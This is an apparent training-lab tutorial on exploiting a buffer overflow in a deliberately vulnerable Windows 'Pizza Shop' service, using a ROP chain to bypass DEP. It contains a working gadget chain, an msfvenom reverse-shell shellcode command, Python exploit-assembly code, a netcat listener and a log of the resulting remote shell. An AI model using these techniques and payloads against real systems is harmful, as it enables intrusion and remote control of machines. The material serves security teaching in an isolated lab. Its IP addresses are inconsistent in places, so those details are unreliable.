# Introduction

In this python3 coding exercise you will learn how to exploit a buffer overflow vulnerability within a remote service that's using enhanced protection mechanisms.

```
                            +--------------+
                            |              |
                            |              |
                            |              |
+------------------+        |              |
|  python3 exploit +------->+  Pizza Shop  |
+------------------+        |              |
                            |              |
                            |              |
                            |              |
                            +--------------+
```

## Learn how to

* reverse engineer binaries
* write a buffer overflow exploit using Return-oriented programming (ROP)
* bypass data execution prevention (DEP)
* make use of the buffer overflow exploit

## Tasks

* Task 1: Analyze the Challenge 
* Task 2: Buffer Overflow Theory
* Task 3: Write the buffer overflow exploit
* Task 4: Make use of the exploit

## Preparation

### Setup Target VM

The virtual machine is based on Windows 7 64-Bit and is targeted to develop your exploit locally beforehand. You can log in with:

**Username:** hacker

**Password:** compass

1. Download the `Victim VM` linked in resources and import it into `VirtualBox`.
2. Within `VirtualBox` navigate to *Devices -> Network -> Network Settings* and change `Attached to` from `NAT` to `Internal Network`

### Setup Hacking Lab

1. Within `VirtualBox` navigate to *Devices -> Network -> Network Settings* and change `Attached to` from `NAT` to `Internal Network`

2. Now navigate within your `Hacking-Lab VM` to *Start -> Settings -> Advanced Network Configuration* and edit `Wired connection 1`

3. Head over to `IPv4 Settings` and change `Method` to `Manual`

4. Now click `Add` to add an **additional static address** and enter the IP-Address `192.168.99.11` with the Netmask `24`

5. Restart the `Networking Service` with:

   ```bash
   sudo systemctl restart networking.service
   ```

### Check the Setup

Now check the setup by trying to ping the `Victim VM` with its IP-Address `192.168.99.11`:

```bash
ping 192.168.99.11 -c 4
```

LOG:

```bash
root@hlkhali:/home/hacker# ping 192.168.99.11
PING 192.168.99.11 (PING 192.168.99.11) 56(84) bytes of data.
64 bytes from 192.168.99.11: icmp_seq=1 ttl=64 time=0.044ms
64 bytes from 192.168.99.11: icmp_seq=2 ttl=64 time=0.038ms
64 bytes from 192.168.99.11: icmp_seq=3 ttl=64 time=0.043ms
64 bytes from 192.168.99.11: icmp_seq=4 ttl=64 time=0.052ms

--- 192.168.99.11 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3129ms
rtt /min/avg/max/mdev = 0.038/0.044/0.052/0.005ms
```

# Analyzing the Challenge

## Make yourself familiar with the Pizza-Server

Make yourself familiar with the pizza ordering service. Connect to the service on the `Victim VM` using netcat and fiddle around.

#### Step 1

Log in to the `Victim VM`

#### Step 2

Start *IDA Pro Free* and simply "Drag & Drop" the *server.exe* located on the `Victim VM`s desktop (C:\Users\hacker\Desktop\ASLR Bypass) into *IDA Pro*.

Within the *Load a new file* choose *Portable executable for 80386 (PE)* and confirm the dialogue by clicking *OK*.

#### Step 3

Set the *server.exe* parameters by navigating to *Debugger -> Process options...* and enter the port `25000` as the parameter.

![IDA Pro - Set debugging parameter](/media/challenge/png/1b68396b-cc8b-45a7-aa76-1faa63f40098.png)

Now run the *Pizza-Server* with *Debugger -> Start  process* or by pressing *F9*. If the server immediately stops: press *F9* again. A `command prompt` will launch showing `Waiting for client to connect...`

![IDA Pro Debugging - Running](/media/challenge/png/7523ef7f-a007-4d78-b945-689d08b2307d.png)

#### Step 4

From within your `Hacking Lab VM` start a new terminal and connect to the Pizza-Server using *netcat*.

```bash
nc 192.168.99.10 25000
```

Choose a pizza and fiddle around with it a few times. Try to investigate what's happening within *Immunity Debugger*.

LOG:

```bash
root@hlkali:/home/hacker# nc 192.168.99.10 25000
==============================================================
 _______  ____   ____   _______  _______  _______             
|       ||    | |    | |       ||       ||   _   |            
|    _  | |   |  |   | |____   ||____   ||  |_|  |            
|   |_| | |   |  |   |  ____|  | ____|  ||       |            
|    ___| |   |  |   | | ______|| ______||       |            
|   |     |   |  |   | | |_____ | |_____ |   _   |            
|___|     |___|  |___| |_______||_______||__| |__|            
 _______  _______  ______    ___     &                        
|       ||       ||    _ |  |   |                             
|       ||_     _||   | ||  |   |                             
|       |  |   |  |   |_||_ |   |                             
|      _|  |   |  |    __  ||   |___                          
|     |_   |   |  |   |  | ||       |                         
|_______|  |___|  |___|  |_||_______|                         
 _______  ___      _______ &                                  
|   _   ||   |    |       |                                   
|  |_|  ||   |    |_     _|                                   
|       ||   |      |   |                                     
|       ||   |___   |   |                                     
|   _   ||       |  |   |                                     
|__| |__||_______|  |___|                                     
 ______   _______  ___      ____   __   __  _______  ______   
|      | |       ||   |    |    | |  | |  ||       ||    _ |  
|  _    ||    ___||   |     |   | |  |_|  ||    ___||   | ||  
| | |   ||   |___ |   |     |   | |       ||   |___ |   |_||_ 
| |_|   ||    ___||   |___  |   | |       ||    ___||    __  |
|       ||   |___ |       | |   |  |     | |   |___ |   |  | |
|______| |_______||_______| |___|   |___|  |_______||___|  |_|
==============================================================



          The P1zza Service for the 31337               
==============================================================
Here is our Menu: 

     1) SQLi

         Spinat, Quinoa, Linsen auf inkabrot und mehr.
         Wir leeren unseren Gewuerz- und Gemuesevorrat ueber der 
         Pizza aus und alles was nicht im Filter haengen bleibt
         kommt drauf

     2) Social Engineering

         Solide 7 sieben Schichten Belag
         (Tomate, Kaese, Ananas, Zwiebeln, Paprika, Schinken, Salami  ) 
         mit einer unerwarteten 8 Schicht. 

     3) Buffer Overflow

         Familienpizza zu viel fuer eine Person ;) 

     4) Bitcoin

         Herkunft anonym (ok Ruecklaeufer von gestern)

     5) Pizza.tar.gz

         Calzone 

     6) Exploiting

         Rootcola, bROPccoli, Thunfissh 

     7) VPN

         Pizza gerollt, Zutaten (Tomaten, Salami, Kaese) von 
         Aussen nicht einsehbar 
1
Gute Wahl
Brauchst du extras [y/N]?y
Wir haben deine Extras
Name:
Hans
Strasse und Hausnr:
Musterstrasse 1
PLZ und Stadt:
8640 Rapperswil-Jona
```

### Reverse Engineering

As you now know what the server does, start to reverse-engineer it.

#### Step 1

Run the *server.exe* from within *IDA Pro* again and now order a pizza and select some extras by entering `y` when asked to. After your order has been placed you'll notice that when you've chosen `y` to select some extras the *server.exe* has loaded the *Functions.dll*.

![IDA Pro - Debugger loading Functions.dll](/media/challenge/png/0616cb30-0dba-4aba-ba0e-25a071b87eef.png)

**For assembly geeks:** Open the tab *IDA View-A* within *IDA Pro* and look through the assembly. At the offset `00000619` things get interesting and you can retrace the behaviour within the assembly as well. 

The library *Functions.dll* will be loaded at the offset `000006F8` - to find the offset look at the picture below or simply use *Jump -> Jump to file offset* and enter the desired offset.

![IDA Pro - Disassembled server.exe](/media/challenge/png/5e91c5a8-7abc-439d-862a-681fff017b5e.png)

#### Step 2

Compilers offer security features to prevent reliable jumps to make use of *buffer overflow* exploits. Inspect the *server.exe* and the *Functions.dll* from within *CFF Explorer* to investigate which security features were used.

Start the *CFF Explorer* and open *server.exe* and *Functions.dll* with *File -> Open*. Navigate to *Optional Header* and click on *Click here* on the line that says *DllCharacteristics*.

server.exe:

- DLL can move
- Image is NX compatible

Functions.dll:

- Image is NX compatible


**DLL can move:** Address Space Layout Randomization (ASLR) is a technique to prevent triggering a buffer overflow (Return oriented Programming) by randomly positioning the base address of an executable and the positions of libraries, heap and stack in a process's address space.

**Image is NX compatible:** No execute is a technique used within x86-processors to improve the security of a computer by preventing the execution of arbitrary data - this method is called *Data Execution Prevention* (DEP) within Windows operating systems.

#### Step 3

So as  *Functions.dll* isn't ASLR protected, investigate that file a little bit more in detail.

Open *Functions.dll* within *IDA Pro* with *File -> Open* and confirm the *Load a new file* dialogue with *OK*.

As you now know the *Functions.dll* gets loaded upon choosing extras, so have a look at the *Exports* section which function may be called from *server.exe*. You'll see the function `parseExtras` which does sound interesting so double click it to investigate it further.

![IDA Pro - Disassembly functions.dll](/media/challenge/png/f575d8ea-3def-4b6f-960b-cf3e19e42062.png)

`parseExtras` pushes the pointer to the argument passed to it into the register`eax`. Afterwards `sub_101015A0` is called so double click ``sub_101015A0` to follow it.

![IDA Pro - Disassembly functions.dll](/media/challenge/png/f263d210-1dc7-459e-b1cd-c8bcfa56c38c.png)

Within `sub_101015A0` the register `eax` is used further. The routine `sub_101015A0` calls the function `strtok` with the argument passed to `parseExtras`. `strtok` is prone to *buffer overflow* and can therefore be misused.

# Buffer Overflow Theory

A *buffer overflow* is a wide-spread **coding mistake**. It occurs when a program attempts to write more data to a buffer than the buffer is actually allocated to hold. An attacker can then cause the application to execute malicious code.

## Memory

**Kernel:** Is at the top of the memory containing the command-line parameters which are passed to the program and environment variables.

**Stack:** Holds local variables for all functions. All local variables within functions are pushed to the end of the stack when the function is called, causing the stack to grow downwards towards the address `0x00000000`.

**Heap:** Contains large allocated objects like images, files etc.

**Data:** Stores uninitialized and initialized variables.

**Text:** The area contains the actual code in assembly form. The text is read-only and can therefore not be modified.

![Buffer Overflow](/media/challenge/gif/e1d05d35-9161-4c1f-9f1c-85475a5332fa.gif)



 Look at the above image illustrating the memory layout of a program. The heap grows in direction of the `stack` and the stack grows in direction of the `heap` which can cause a "collision" at some point.

## Example

When you call the program with the argument `hello` everything will be fine as hello contains only **five characters** but as soon as you call the program with an argument being **six characters** long e.g. `hello1` you've provoked a *buffer overflow*. 

The program isn't checking the input boundaries which means the programmer should either implement a check for the length of the argument or use *strcpy_s* as an alternative. Within C/C++ it's the programmer's responsibility to assert a correctly sized buffer.

```c
#include <stdio.h>
#include <string.h>

void readInput(char *input){
    char buffer[5];
    strcpy(buffer, input);
    printf("buffer = %s\n", buffer);
}

int main(int argc, char *argv[]){
    readInput(argv[1]);
	return 0;
}
```

# Buffer Overflow Exploiting

To exploit a *buffer overflow* it's necessary to place code within the stacks memory. To do so you'll have to write data into a `buffer` that isn't protected from overflowing.

## Finding the correct buffer size

This part concentrates on finding the size of the buffer. You'll need to write at least as much data into the buffer as it can hold to overflow it.

### Step 1

Start *IDA Pro* again and load *server.exe* into it. Set the *Parameters* within *Process Options...* again to `2500`.

### Step 2

Now start the *Debugger* and open your `Hacking Lab VM` side by side so you are able to inspect the debugging process.

### Step 3

Connect to the server with the command:

```bash
nc 192.168.99.10 25000
```

Now choose any pizza you like.

When you are asked to choose extras write `y` but don't send it yet as you will extend that string further.

Now comes the part of exploiting. You'll have to find out which length of a string / data is needed to overflow the buffer into the stack. So just try out a long character sequence like:

```
evolcjlhuiisemnzhsveytmzcwidezkzcvxiwxfuglelrnlfdsymskkrvzolqdhucqgjjzkooyolwhtethimtwoymkncrslewjdztipbjccovnivevjzobhpcoonpssmetcglxsvpnyghnuxfvuciyyknaepojxfcztfzdqhuarghveexglcrcjnlocmwqyjmdekbtytxdsnxmsjnhyicfhdzksxyzofqsiomcadtekznmnxhziitdjgqcsajnghnwlcecpwkqvhcfscngiwqnxskzbyxxzlhroxnovqghyb
```

Now send your string by pressing `enter`, your sequence should have a leading `y` to trigger the load of `Functions.dll`.

LOG:

```bash
root@hlkali:/home/hacker# nc 192.168.99.10 25000
==============================================================
 _______  ____   ____   _______  _______  _______             
|       ||    | |    | |       ||       ||   _   |            
|    _  | |   |  |   | |____   ||____   ||  |_|  |            
|   |_| | |   |  |   |  ____|  | ____|  ||       |            
|    ___| |   |  |   | | ______|| ______||       |            
|   |     |   |  |   | | |_____ | |_____ |   _   |            
|___|     |___|  |___| |_______||_______||__| |__|            
 _______  _______  ______    ___     &                        
|       ||       ||    _ |  |   |                             
|       ||_     _||   | ||  |   |                             
|       |  |   |  |   |_||_ |   |                             
|      _|  |   |  |    __  ||   |___                          
|     |_   |   |  |   |  | ||       |                         
|_______|  |___|  |___|  |_||_______|                         
 _______  ___      _______ &                                  
|   _   ||   |    |       |                                   
|  |_|  ||   |    |_     _|                                   
|       ||   |      |   |                                     
|       ||   |___   |   |                                     
|   _   ||       |  |   |                                     
|__| |__||_______|  |___|                                     
 ______   _______  ___      ____   __   __  _______  ______   
|      | |       ||   |    |    | |  | |  ||       ||    _ |  
|  _    ||    ___||   |     |   | |  |_|  ||    ___||   | ||  
| | |   ||   |___ |   |     |   | |       ||   |___ |   |_||_ 
| |_|   ||    ___||   |___  |   | |       ||    ___||    __  |
|       ||   |___ |       | |   |  |     | |   |___ |   |  | |
|______| |_______||_______| |___|   |___|  |_______||___|  |_|
==============================================================



          The P1zza Service for the 31337               
==============================================================
Here is our Menu: 

     1) SQLi

         Spinat, Quinoa, Linsen auf inkabrot und mehr.
         Wir leeren unseren Gewuerz- und Gemuesevorrat ueber der 
         Pizza aus und alles was nicht im Filter haengen bleibt
         kommt drauf

     2) Social Engineering

         Solide 7 sieben Schichten Belag
         (Tomate, Kaese, Ananas, Zwiebeln, Paprika, Schinken, Salami  ) 
         mit einer unerwarteten 8 Schicht. 

     3) Buffer Overflow

         Familienpizza zu viel fuer eine Person ;) 

     4) Bitcoin

         Herkunft anonym (ok Ruecklaeufer von gestern)

     5) Pizza.tar.gz

         Calzone 

     6) Exploiting

         Rootcola, bROPccoli, Thunfissh 

     7) VPN

         Pizza gerollt, Zutaten (Tomaten, Salami, Kaese) von 
         Aussen nicht einsehbar 
1
Gute Wahl
Brauchst du extras [y/N]?yevolcjlhuiisemnzhsveytmzcwidezkzcvxiwxfuglelrnlfdsymskkrvzolqdhucqgjjzkooyolwhtethimtwoymkncrslewjdztipbjccovnivevjzobhpcoonpssmetcglxsvpnyghnuxfvuciyyknaepojxfcztfzdqhuarghveexglcrcjnlocmwqyjmdekbtytxdsnxmsjnhyicfhdzksxyzofqsiomcadtekznmnxhziitdjgqcsajnghnwlcecpwkqvhcfscngiwqnxskzbyxxzlhroxnovqghyb
```

### Step 4

Analyse the stack and registers within *IDA Pro*. 

*IDA Pro* will prompt you with a warning, that the instruction at the current referenced memory couldn't be read. Confirm this prompt with *OK*.

![IDA Pro - Debugging overflow](/media/challenge/png/cd002e8f-0ac2-40bb-8b69-14d2f5470402.png)

At the bottom of *IDA Pro* you'll see *General registers*. Have a look at the `EIP - the Extended Instruction Pointer`. The `EIP` will contain the "instruction" `0x77706365` which is the hexadecimal representation of the ASCII-string **wpce**. 

**But** as the data is held in little-endian you've to reverse the string = > **ecpw**.

![IDA Pro - Debugging registers](/media/challenge/png/a9f29d6a-a5c0-4597-b7ff-fcbb37b1d0c6.png)

Now compare the string **ecpw** to the sequence you've created above:

```
evolcjlhuiisemnzhsveytmzcwidezkzcvxiwxfuglelrnlfdsymskkrvzolqdhucqgjjzkooyolwhtethimtwoymkncrslewjdztipbjccovnivevjzobhpcoonpssmetcglxsvpnyghnuxfvuciyyknaepojxfcztfzdqhuarghveexglcrcjnlocmwqyjmdekbtytxdsnxmsjnhyicfhdzksxyzofqsiomcadtekznmnxhziitdjgqcsajnghnwlc
--->ecpw<--- kqvhcfscngiwqnxskzbyxxzlhroxnovqghyb
```

This means that the buffer used is able to hold everything before the **ecpw** - which are actually 260 characters. 

```
evolcjlhuiisemnzhsveytmzcwidezkzcvxiwxfuglelrnlfdsymskkrvzolqdhucqgjjzkooyolwhtethimtwoymkncrslewjdztipbjccovnivevjzobhpcoonpssmetcglxsvpnyghnuxfvuciyyknaepojxfcztfzdqhuarghveexglcrcjnlocmwqyjmdekbtytxdsnxmsjnhyicfhdzksxyzofqsiomcadtekznmnxhziitdjgqcsajnghnwlc
```

## Return-oriented Programming (ROP)

As DEP prevents the execution of code from the stack you'll have to bypass that restriction by using *Return-oriented programming*. ROP is an exploit technique allowing an attacker to execute code with DEP enabled by gaining control of the call stack an executing machine instruction sequences that are already present in the memory. These instructions ending with `ret` are called "gadgets", these gadgets are then "chained" together to a so called *rop-chain* .

The *rop-chain* aims to mark the injected shellcode as executable within the memory page by changing the acces protection level using the `VirtualProtect` function

If you want to dig deeper into *Return-oriented programming* watch the following video on Youtube from "LiveOverflow" explaining ROP. [ROP Tutorial - Video](https://www.youtube.com/watch?v=zaQVNM3or7k)

**Important:** Finding a working *rop-chain* is very challenging in some circumstances and requires good knowledge in assembly. As *mona.py*, an rop-gadget finder couldn't find an *rop-chain* for the pizza-server, you'll be using a pre-defined *rop-chain* instead.

### Step 1

Start the *Immunity Debugger* on your `Victim VM` and open *server.exe* with *File -> Open* and set *Arguments* to `25000`.

At the bottom row enter the following command to create a working folder for mona:

```
!mona config -set workingfolder c:\mona\%p
```

![Immunity Debugger - Mona config](/media/challenge/png/6da0010f-f3b4-4244-8045-ac18aaed064b.png)

### Step 2

Now start *server.exe* in debugging mode by pressing *F9* or pressing the *Play* button.

On your `Hacking Lab VM` open a terminal and connect to the server using:

```bash
nc 192.168.99.10 25000
```

Now choose a pizza and pick some extras.

LOG:

```bash
root@hlkali:/home/hacker# nc 192.168.99.10 25000
==============================================================
 _______  ____   ____   _______  _______  _______             
|       ||    | |    | |       ||       ||   _   |            
|    _  | |   |  |   | |____   ||____   ||  |_|  |            
|   |_| | |   |  |   |  ____|  | ____|  ||       |            
|    ___| |   |  |   | | ______|| ______||       |            
|   |     |   |  |   | | |_____ | |_____ |   _   |            
|___|     |___|  |___| |_______||_______||__| |__|            
 _______  _______  ______    ___     &                        
|       ||       ||    _ |  |   |                             
|       ||_     _||   | ||  |   |                             
|       |  |   |  |   |_||_ |   |                             
|      _|  |   |  |    __  ||   |___                          
|     |_   |   |  |   |  | ||       |                         
|_______|  |___|  |___|  |_||_______|                         
 _______  ___      _______ &                                  
|   _   ||   |    |       |                                   
|  |_|  ||   |    |_     _|                                   
|       ||   |      |   |                                     
|       ||   |___   |   |                                     
|   _   ||       |  |   |                                     
|__| |__||_______|  |___|                                     
 ______   _______  ___      ____   __   __  _______  ______   
|      | |       ||   |    |    | |  | |  ||       ||    _ |  
|  _    ||    ___||   |     |   | |  |_|  ||    ___||   | ||  
| | |   ||   |___ |   |     |   | |       ||   |___ |   |_||_ 
| |_|   ||    ___||   |___  |   | |       ||    ___||    __  |
|       ||   |___ |       | |   |  |     | |   |___ |   |  | |
|______| |_______||_______| |___|   |___|  |_______||___|  |_|
==============================================================



          The P1zza Service for the 31337               
==============================================================
Here is our Menu: 

     1) SQLi

         Spinat, Quinoa, Linsen auf inkabrot und mehr.
         Wir leeren unseren Gewuerz- und Gemuesevorrat ueber der 
         Pizza aus und alles was nicht im Filter haengen bleibt
         kommt drauf

     2) Social Engineering

         Solide 7 sieben Schichten Belag
         (Tomate, Kaese, Ananas, Zwiebeln, Paprika, Schinken, Salami  ) 
         mit einer unerwarteten 8 Schicht. 

     3) Buffer Overflow

         Familienpizza zu viel fuer eine Person ;) 

     4) Bitcoin

         Herkunft anonym (ok Ruecklaeufer von gestern)

     5) Pizza.tar.gz

         Calzone 

     6) Exploiting

         Rootcola, bROPccoli, Thunfissh 

     7) VPN

         Pizza gerollt, Zutaten (Tomaten, Salami, Kaese) von 
         Aussen nicht einsehbar 
1
Gute Wahl
Brauchst du extras [y/N]?y
Wir haben deine Extras
```

### Step 3

Now head over to your `Victim VM` and within *Immunity Debugger* open *View -> Executable Modules*. You'll see that *Function.dll* is now loaded.

Now type in the following command at the bottom line of *Immunity Debugger*:

```
!mona rop -cp nonull
```

Mona generated *rop-chains* now and exported it to *C:\mona\Server\rop_chains.txt*. If you look at the file you'll notice the missing gadgets. You'd have to search your own gadgets manually to create the register-setup stated below. 

As you'll be provided a working chain you don't have to search for them.

File:

```
Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
...

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x10103967,  # POP ESI # RETN [Functions.dll] 
      0x10105014,  # ptr to &VirtualProtect() [IAT Functions.dll]
      0x10101056,  # MOV ESI,DWORD PTR DS:[ESI] # RETN [Functions.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x101011c5,  # POP EBP # RETN [Functions.dll] 
      0x1010100e,  # & jmp esp [Functions.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x00000000,  # [-] Unable to find gadget to put 00000201 into ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x10101288,  # POP EBX # RETN [Functions.dll] 
      0xfffffe3f,  # put delta into ebx (-> put 0x00000040 into edx)
      0x1010103f,  # ADD EBX,201 # RETN [Functions.dll] 
      0x101041de,  # ADD EDX,EBX # POP EBX # RETN 0x10 [Functions.dll] 
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ecx:---]
      0x10103c5c,  # POP ECX # RETN [Functions.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x10106429,  # &Writable location [Functions.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x1010145a,  # POP EDI # RETN [Functions.dll] 
      0x10103945,  # RETN (ROP NOP) [Functions.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x00000000,  # [-] Unable to find gadget to put 90909090 into eax
      #[---INFO:pushad:---]
      0x10101503,  # PUSHAD # RETN [Functions.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
...
```

**Working Chain:**

```python
def create_rop_chain():
    # This rop chain prepares the registers and the stack
    # with the needed information to call:
    #    VirtualProtect(<esp>, 1024, 0x40, <addr_to_write>)
    #
    # This call disabled DEP for 1024 bytes starting at the
    # current ESP position (the beginning of the shellcode)
    # Author: brix
    
    # EDX = NewProtect (0x40)
    rop_chain = struct.pack('<I', 0x10101288)  # POP EBX # RETN     - EBX = 0xfffffe3f
    rop_chain += struct.pack('<I', 0xfffffe3f)
    rop_chain += struct.pack('<I', 0x1010103f) # ADD EBX,201 # RETN - EBX = 0x40
    rop_chain += struct.pack('<I', 0x1010100B) # XOR EDX,EDX # RETN - EDX = 0x00
    rop_chain += struct.pack('<I', 0x101041de) # ADD EDX,EBX # RETN - EDX = 0x40
    rop_chain += struct.pack('<I', 0x41414141) # [Filler]

    # EAX = NOP (0x90909090)
    rop_chain += struct.pack('<I', 0x101010F3) # XOR EAX,EAX # ADD EAX 0x90909090 # RETN - EAX = 0x90909090
    rop_chain += struct.pack('<I', 0x41414141) # [Filler]
    rop_chain += struct.pack('<I', 0x41414141) # [Filler]

    # ECX = lpOldProtect (ptr to W address)
    rop_chain += struct.pack('<I', 0x10103c5c) # POP EXC # RETN - ECX = 0x10106af0
    rop_chain += struct.pack('<I', 0x10106af0)

    # EBX = dwSize
    rop_chain += struct.pack('<I', 0x10101288) # POP EBX # RETN - EBX = 0xfffffffe
    rop_chain += struct.pack('<I', 0xfffffffe)
    rop_chain += struct.pack('<I', 0x1010103f) # ADD EBX,201 # RETN
    rop_chain += struct.pack('<I', 0x1010103f) # ADD EBX,201 # RETN - EBX = 0x400

    # EBP = ReturnTo (ptr to jmp esp)
    rop_chain += struct.pack('<I', 0x10102e6c) # POP EBP # RETN - EBP = 0x1010100e
    rop_chain += struct.pack('<I', 0x1010100e) # [JMP ESP]

    # ESI = ptr to VirtualProtect()
    rop_chain += struct.pack('<I', 0x10101055) # POP ESI # MOV ESI,DWORD PTR DS:[ESI] - ESI = &VirtualProtect
    rop_chain += struct.pack('<I', 0x10105014) # Address of the VirtualProtect address

    # EDI = ROP NOP (RETN)
    rop_chain += struct.pack('<I', 0x10101059) # POP EDI # RETN - EDI = 0x10103945
    rop_chain += struct.pack('<I', 0x10103945) # [RETN]

    # PUSHAD # RETN
    rop_chain += struct.pack('<I', 0x10101503) # PUSHAD # RETN

    return rop_chain
```

## Shellcode

Theoretically you are now able to execute malicious code so generate a *reverse-shell* now.

Head over to your `Hacking Lab VM` and open a new terminal. Use the following code to generate shellcode for a *reverse shell*.

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.99.11 LPORT=4444 -f py -e x86/alpha_upper
```

# Exploit writing

As you have all pieces together tangle them up in a python script.

### Setup Python Environment

```bash
mkdir -p /opt/git
cd /opt/git
git clone https://github.com/ibuetler/p3s-re-exploit.git
cd /opt/git/p3s-re-exploit/ASLR
pipenv --python 3 sync
pipenv --python 3 shell
```

## Step 1

### Communicating with the server

To start communicating with the server you'll have to use a *socket*.

```python
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((IP-Address, Port))
```

Upon a new connection with the pizza-server it'll send the menu first. To receive the menu/data use:

```python
sock.recv(4096)
```

The next step is to pick a pizza, to do so use:

```python
sock.send(b"1")
```

**Important:** The *b* is necessary as *sock.send()* expects data in byte-format, you could use *str.encode()* as an alternative.

The server will now send you the option to choose *extras* so receive it with:

```python
sock.receive(4096)
```

To get *Functions.dll* loaded *extras* have to be chosen:

```python
sock.send(b"y")
```

## Step 2

### Writing the Exploit

To trigger the *buffer-overflow* padding in form of 260-characters is needed.

```python
exploit_padding = b"A" * 260
```

Now *Copy & Paste* the working *rop-chain* / function of the chapter *Return-oriented programming* into your code and call it. Add the import for *struct* to your script.

```python
import struct

exploit_rop_chain = create_rop_chain()
```

Define a function *create_shellcode()* that returns the shellcode you've created with *msfvenom* and adds a few nops (no operation code) which acts as a slide for your shellcode if it's not located exactly where it has to.

```python
def create_shellcode():
    # your shellcode
    buf = b""
    ...
    
    nops = b"\x90" * 10
    return nops + buf
```

Chain together the whole exploit and send it:

```python
exploit = exploit_padding + exploit_rop_chain + exploit_shellcode
sock.send(exploit)
```

Lastly, close the socket you've initiated with:

```python
sock.close()
```

## Step 3

### Exploiting

Start the server again within *Immunity Debugger* on port *25000*.

On your `Hacking Lab VM` open a new terminal and enter the following command to wait for a new incoming tcp-connection:

```bash
nc -nvlp 4444
```

Again on your `Hacking Lab VM` open another terminal and run your python script.

```bash
python3 myscript.py
```

The terminal where you've created the *listener* on port 4444 should now show a new connection from the pizza-server. This connection is a *reverse-shell* allowing you to run commands on the windows command-line as *dir*.

LOG:

```bash
root@hlkali:/home/hacker/Desktop# nc -nvlp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.99.10.
Ncat: Connection from 192.168.99.10:49281.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Alle Rechte vorbehalten.

C:\Users\hacker\Desktop\ASLR Bypass>dir
dir
 Volume in Laufwerk C: hat keine Bezeichnung.
 Volumeseriennummer: 38B1-D7E3

 Verzeichnis von C:\Users\hacker\Desktop\ASLR Bypass

07.05.2020  15:35    <DIR>          .
07.05.2020  15:35    <DIR>          ..
04.05.2020  11:24            21'504 Functions.dll
04.05.2020  11:24            13'824 Server.exe
               2 Datei(en),         35'328 Bytes
               2 Verzeichnis(se), 23'487'664'128 Bytes frei

C:\Users\hacker\Desktop\ASLR Bypass>
```
